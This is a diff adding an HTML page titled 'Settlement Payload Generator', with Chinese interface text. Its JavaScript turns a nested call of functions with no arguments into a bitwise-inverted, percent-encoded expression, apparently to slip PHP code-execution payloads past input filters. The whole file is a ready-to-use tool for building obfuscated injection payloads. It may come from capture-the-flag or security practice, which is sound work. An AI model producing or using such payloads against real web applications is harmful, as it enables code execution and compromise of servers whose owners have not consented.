@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Settlement Payload Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        input[type="text"], textarea {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .result {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Settlement Payload Generator</h1>
+    <p>输入类似 A(B(C())); 的无参函数嵌套:</p>
+    <input type="text" id="inputString" placeholder="例如: A(B(C()));">
+    <button onclick="generatePayload()">生成Payload</button>
+
+    <div class="result">
+        <h2>结果:</h2>
+        <textarea id="outputResult" rows="5" readonly></textarea>
+    </div>
+
+    <script>
+        function one(s) {
+            let result = "[~";
+            for (let i = 0; i < s.length; i++) {
+                let charCode = s.charCodeAt(i);
+                let inverted = 255 - charCode;
+                let hex = inverted.toString(16).toUpperCase();
+                if (hex.length < 2) {
+                    hex = "0" + hex;
+                }
+                result += "%" + hex;
+            }
+            result += "][!%FF](";
+            return result;
+        }
+
+        function generatePayload() {
+            let inputString = document.getElementById("inputString").value.trim();
+            if (inputString.endsWith(")")) {
+                inputString = inputString.slice(0, -1);
+            }
+
+            let parts = inputString.split("(");
+            let result = "";
+
+            for (let i = 0; i < parts.length - 1; i++) {
+                result += one(parts[i]);
+            }
+
+            result += ")".repeat(parts.length - 1) + ";";
+            document.getElementById("outputResult").value = result;
+        }
+    </script>
+</body>
+</html>
